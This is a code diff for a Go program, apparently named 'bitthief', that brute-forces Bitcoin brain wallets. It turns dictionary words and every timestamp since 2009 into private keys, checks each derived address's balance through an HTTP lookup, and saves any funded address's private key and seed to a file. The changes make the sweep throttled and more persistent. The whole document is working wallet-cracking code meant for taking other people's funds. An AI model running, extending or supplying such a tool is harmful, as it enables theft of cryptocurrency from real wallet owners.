@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"time"
 
 	"github.com/etherparty/bitthief/btckey"
 )
@@ -30,7 +31,6 @@ func main() {
 	// if a single word was passed in, let it chill.
 	if *wordPtr != "" {
 		handle([]byte(*wordPtr), true)
-
 		os.Exit(0)
 	}
 
@@ -39,6 +39,7 @@ func main() {
 		fmt.Printf("%s", err)
 		os.Exit(1)
 	}
+	defer file.Close()
 
 	var words []string
 	scanner := bufio.NewScanner(file)
@@ -48,13 +49,13 @@ func main() {
 
 	// loop through timestamps
 	if *timestampPtr {
-		janFirst2018 := 1167609600
-		now := 1519173144
+		janFirst2009 := 1230768000
+		now := int(time.Now().Unix())
 
 		go func() {
-			for i := janFirst2018; i < now; i++ {
+			for i := janFirst2009; i < now; i++ {
+				time.Sleep(300 * time.Millisecond)
 				seed := strconv.Itoa(i)
-
 				handle([]byte(seed), false)
 			}
 		}()
@@ -64,6 +65,7 @@ func main() {
 	// loop through all words
 	go func() {
 		for _, word := range words {
+			time.Sleep(300 * time.Millisecond)
 			handle([]byte(word), false)
 		}
 	}()
@@ -79,7 +81,7 @@ func handle(seed []byte, singleton bool) {
 	privateKey := btckey.PrivateKey{}
 	if err := privateKey.FromBytes(hashedBytes[:]); err != nil {
 		fmt.Printf("%s", err)
-		os.Exit(1)
+		return
 	}
 
 	btcAddress := privateKey.PublicKey.ToAddressUncompressed()
@@ -89,32 +91,25 @@ func handle(seed []byte, singleton bool) {
 	resp, err := http.Get(url)
 	if err != nil {
 		fmt.Printf("%s", err)
-		os.Exit(1)
+		return
 	}
-	defer resp.Body.Close()
 	contents, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		fmt.Printf("%s", err)
-		os.Exit(1)
+		return
 	}
+	resp.Body.Close()
+
 	contentValue, err := strconv.Atoi(string(contents))
 	returnString := fmt.Sprintf("Address %s has balance %s, Password: %s, private key: %s \n", btcAddress, string(contents), string(seed), privateKey.ToWIF())
 	if err != nil {
 		fmt.Printf("%s", err)
 		os.Exit(1)
 	}
+
 	if contentValue > 0 {
-		fmt.Println("========================== \n THE IMPOSSIBLE IS POSSIBLE! \n =========================")
-		filename := fmt.Sprintf("%s.txt", privateKey.ToWIF())
+		filename := fmt.Sprintf("./%s.txt", privateKey.ToWIF())
 		file, err := os.Create(filename)
-		if err != nil {
-			fmt.Printf("%s", err)
-			os.Exit(1)
-		}
-		file.WriteString(returnString)
-		file.Close()
-	} else {
-		file, err := os.Open("attempts.txt")
 		if err != nil {
 			fmt.Printf("%s", err)
 			os.Exit(1)
